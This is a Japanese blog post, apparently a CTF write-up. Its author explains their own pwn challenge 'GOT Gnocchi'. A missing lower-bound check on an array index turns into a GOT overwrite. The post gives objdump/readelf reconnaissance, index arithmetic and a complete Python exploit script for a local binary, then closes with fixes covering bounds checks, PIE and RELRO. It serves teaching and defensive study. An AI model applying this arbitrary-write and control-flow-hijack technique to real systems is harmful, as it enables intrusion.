---
title: "負のインデックスからGOT overwriteへ、TofuCTF「GOT Gnocchi」を作って解く"
emoji: "🥟"
type: "tech"
topics: ["ctf", "pwn", "security", "linux", "elf"]
published: true
---

自分専用のpwn学習サイト「TofuCTF」では、毎日ひとつずつpwn問題を追加しています。前回の記事ではサイトの仕組みを紹介しましたが、今回は2026-09-26に追加した問題「GOT Gnocchi」を題材に、**負の配列インデックスを許す入力がどうGOT overwriteに繋がるか**を解説します。

TofuCTFでは「問題公開から7日後に完全な解説とexploit例を開放する」運用にしています。GOT Gnocchiの解説開放は2026-10-03以降の予定ですが、技術的な学びの部分を先に独立した記事としてまとめました。

- TofuCTF: https://tasodoufu.github.io/TofuCTF/
- 対象問題: GOT Gnocchi（ローカルamd64 / no PIE / Partial RELRO / strip済み）

## 問題の構造

問題のCソース（作者側で保持しているもの、本記事用に略）の骨格は次の通りです。

```c
typedef void (*action_t)(void);
action_t action_table[4];

int main(void) {
    action_table[0] = inspect_gnocchi;
    action_table[1] = edit_recipe;
    action_table[2] = serve_gnocchi;
    action_table[3] = close_kitchen;

    for (;;) {
        menu();
        long choice = strtol(line, NULL, 10);
        if (choice < 1 || choice > 4) { /* ... */ }
        action_table[choice - 1]();
    }
}

static void edit_recipe(void) {
    /* スロット番号を10進で読む */
    index = strtol(line, &end, 10);
    if (end == line || *end != '\0' || index > 3) {
        puts("That slot is not on the menu.");
        return;
    }

    /* 書き込む値を16進で読む */
    value = strtoull(line, &end, 16);
    /* ... */

    /* 負のインデックスがそのまま通る */
    action_table[index] = (action_t)value;
    puts("Recipe slot updated.");
}
```

目的は`secret_gnocchi()`という呼び出し経路のない関数（内部で`/flag`を読んで表示する）を呼ぶことです。標準の操作では`close_kitchen`→`exit(0)`で終了するだけでflagは出ません。

脆弱性は`edit_recipe`のスロット番号検査です。

```c
if (end == line || *end != '\0' || index > 3)
```

上限の`3`だけを見ていて、**下限のチェックがない**ため、`strtol`が返す負の値がそのまま`action_table[index]`の添字になります。`index`は`long`なので`-10`のような値は素通りします。

Cの配列アクセスに境界検査はないため、`action_table[-10]`は「テーブル先頭から80バイト手前」の8バイトへの書き込みです。さらに書き込む値も16進で自由に指定できるため、実質的に「テーブルを基準にした任意の8バイト書き込み」プリミティブになります。

## 下調べ: strip済みELFから必要なアドレスを読む

配布バイナリはstripされています。

```text
ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped
```

攻撃に必要なのは3つのアドレスです。stripされていても、次の手順で全部読めました。

### 1. PIEがない（EXECタイプ）のでアドレスが固定

```console
$ readelf -h got-gnocchi | grep Type
Type:                              EXEC (Executable file)
```

非PIEなのでロードアドレスが固定です。一度調べた値をexploit内の定数としてそのまま使えます。

### 2. objdump -R でGOTスロットの位置が分かる

`-R`は動的リロケーションを一覧します。stripで消えるのはシンボルテーブルであって、実行時に必要なリロケーション情報は残るため、`exit@GOT`の正確なアドレスが読めます。

```console
$ objdump -R got-gnocchi | grep -Ei 'exit'
0000000000404000 R_X86_64_JUMP_SLOT  _exit@GLIBC_2.2.5
0000000000404050 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
```

### 3. 逆アセンブルでテーブルと目的関数を特定する

`action_table`への初期化は`main`内の`mov QWORD PTR [rip+0x2a75], rax`で、実効アドレスが`0x4040a0`と分かります。`secret_gnocchi`は`used`属性を付けているため、strip後も呼び出し経路なしでコード自体は残っており、先頭が`0x401396`です。

```console
$ objdump -d -M intel got-gnocchi | grep -E '^  40(1396|1624)' -A2
  401396:  f3 0f 1e fa             endbr64
  ...
  401624:  48 89 05 75 2a 00 00    mov QWORD PTR [rip+0x2a75],rax  # 4040a0
```

また、`exit@plt`の実体を見るとGOT間接参照が確認できます。

```console
$ objdump -d -M intel got-gnocchi | grep -B1 -A4 '<exit@plt>'
0000000000401190 <exit@plt>:
  401190:  endbr64
  401194:  ff 25 b6 2e 00 00       jmp QWORD PTR [rip+0x2eb6]  # 404050
```

RELROの確認は`readelf -l`で行います。`GNU_RELRO`セグメントは存在するものの、`BIND_NOW`相当のdynamicフラグがなく**Partial RELRO**です。このため`.got.plt`（JUMP_SLOT領域、0x404050を含む）が書き込み可能のまま残ります。

まとめると:

- `action_table` = 0x4040a0
- `exit@GOT` = 0x404050
- `secret_gnocchi` = 0x401396

## インデックスの計算

`edit_recipe`で書き込めるのは`action_table`を基準に8バイト単位でずれた位置です。`exit@GOT`がテーブルの何要素手前にあるかを計算します。

```python
action_table = 0x4040a0
exit_got     = 0x404050
secret       = 0x401396

delta = exit_got - action_table      # -0x50
assert delta % 8 == 0                # ポインタ境界に整列していることを確認
index = delta // 8                   # -10
```

アドレス差そのものをハードコードせず、この換算式をそのままexploitに書いておくと、テーブルとGOTの相対位置が変わっても追従します。ポインタ幅で割り切れないズレは書き込み先として不正なので、本来は失敗させるべき対象です。

## exploit

必要な入力は4ステップです。

1. メニューで`2`（edit_recipe）
2. スロット番号`-10`
3. 値として`0x401396`（16進）
4. メニューで`4`（close_kitchen）→ `exit@plt`が書き換えられたGOT経由で`secret_gnocchi`に飛ぶ

プロンプト同期のための単純な`until`ヘルパー付きの実装がこれです。

```python
#!/usr/bin/env python3
import hashlib
import socket
import sys
from pathlib import Path

root = Path(__file__).parent.parent
slug = "got-gnocchi"
binary = root / "challenge-dist" / slug / slug
binary_hash = hashlib.sha256(binary.read_bytes()).hexdigest()
flag = "TofuCTF{" + hashlib.sha256(
    f"tofuctf-local-v1:{slug}:{binary_hash}".encode()
).hexdigest()[:32] + "}"

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 31337

# strip済みELFだがno PIEなので、objdump -Rで読んだ値を固定値として扱える
action_table = 0x4040a0
exit_got = 0x404050
secret = 0x401396

delta = exit_got - action_table
assert delta % 8 == 0
index = delta // 8                   # -10

with socket.create_connection((host, port), timeout=5) as sock:
    cell = [b""]

    def until(token):
        buf = cell[0]
        while token not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                raise RuntimeError(f"connection closed before {token!r}")
            buf += chunk
        end = buf.index(token) + len(token)
        cell[0] = buf[end:]
        return buf[:end]

    until(b"> ")
    sock.sendall(b"2\n")
    until(b"Recipe slot: ")
    sock.sendall(f"{index}\n".encode())
    until(b"New handler address (hex): ")
    sock.sendall(f"{secret:x}\n".encode())
    until(b"Recipe slot updated.\n")
    until(b"> ")
    sock.sendall(b"4\n")
    output = cell[0]
    sock.settimeout(2)
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        output += chunk

if flag.encode() not in output:
    raise SystemExit(f"exploit failed; got {output!r}")
print(flag)
```

flag値そのものは配布物に含めていません。`run.sh`が配布バイナリのSHA-256とslugから決定的に導出した値をDockerのvolumeへ書き込む構造で、この仕組みの詳細は以前の記事「GitHub Pagesで配る、ローカルDocker型pwn環境の作り方」に書いています。

## 検証

Dockerデーモンにアクセスできない検証ホストだったため、flagパスだけを書き換えた実験用コピーで実際の動作を確認しました。オリジナル配布バイナリの`/flag`という文字列リテラルを、書き込み可能なパスへ差し替えるだけで、コードの制御フローは1バイトも変わりません。

```python
s = open("/tmp/gg-test", "rb").read()
assert s.count(b"/flag\x00") == 1
open("/tmp/gg-test", "wb").write(s.replace(b"/flag\x00", b"flagx\x00"))
```

このコピーをローカルのTCPポートで`fork`式に待ち受けさせ、flagファイルには同じ導出式（slugとコピーのSHA-256から計算）で生成した値を置き、先ほどのexploitスクリプトをそのまま実行しました。

```text
$ python3 author/exploit-got-gnocchi.py 127.0.0.1 31342
A hidden gnocchi recipe appears: TofuCTF{1a439585...
```

期待通り`exit()`の呼び出しが`secret_gnocchi`への制御フロー移行に化け、flag文字列が出力されました。byte列レベルの差分はflagパス6バイトだけなので、書き換え先・制御フロー・入力系列は配布版と同一という条件での検証です。

## 学び

### 下限チェックを忘れると「テーブル手前に何でも書ける」権限になる

配列の添字検査で`index > 3`（上限だけ）を見るのは、日常コードでもよくあるパターンです。この問題ではテーブルの前方に`.got.plt`が隣接していて、偶然その中の`exit@GOT`へ届きます。境界チェックはコンパイラが代わりにやってくれないので、データセクション同士が隣接しているCの実装では、小さなチェック漏れがそのまま制御フローの乗っ取りに繋がります。

安全に書くなら`unsigned`型で受けた上で下限の考慮を消す方法が手堅いです。

```c
/* indexをunsignedで受ける。負の入力はstrtoullが巨大値にして返す */
if (index >= 4) { reject(); }
```

あるいは`long`のままなら明示的に`index < 0`も弾きます。要は「この値は符号付きで解釈されうるのか」を意識することがポイントです。

### stripされても、no PIEなら攻撃に必要な情報は残る

stripはシンボルテーブルを消すだけで、リロケーションとコード自身は残ります。上述の通り`objdump -R`でGOTスロットの位置が確認でき、`Type: EXEC`でロードアドレスが固定なのでexploitに必要な定数がすべて事前に決まります。PIE（`ET_DYN`＋ASLR相当のベースランダム化）は、この「アドレスが前もって読める」性質を壊す防御として本質的です。`readelf -h`で`Type`が`ET_DYN`（PIEの可能性あり）と`ET_EXEC`（非PIE確定）のどちらになるかを区別する癖は、pwnに限らずビルド設定を監査するときにも役立ちます。

### GOT overwriteは結果であって原因ではない

今回の問題では、負のインデックスによる書き込みが任意8バイト書き込みプリミティブを与え、その書き込み先の一つとして`exit@GOT`が選ばれました。GOT overwriteは最終的な攻撃手段で、根っこにあるのはインデックスの検査漏れです。CTFでも実コードの監査でも、「入力がどこまでのメモリを書けてしまうか」を1段階抽象して考えると、GOTという具体的なターゲットに頼らずに考察しやすくなります。

## 参考資料

- [TofuCTF](https://tasodoufu.github.io/TofuCTF/) — 問題のダウンロードと`run.sh`でローカル起動
- [GitHub Pagesで配る、ローカルDocker型pwn環境の作り方](https://zenn.dev/tasodoufu/articles/github-pages-local-docker-pwn) — flagをDocker volumeに入れる仕組みの詳細
- [binutils objdump マニュアル](https://sourceware.org/binutils/docs/objdump/) — `-R`（dynamic relocation表示）の説明
- [ELF specification (TIS)](https://refspecs.linuxbase.org/elf/elf.pdf) — EXEC/DYNタイプとリロケーション
- [RELRO: Red Hat Developer の解説](https://developers.redhat.com/blog/2020/03/26/hardening-elf-binaries-using-relro-and-read-only-relocations-an-introduction) — Partial RELROとFull RELROの違い
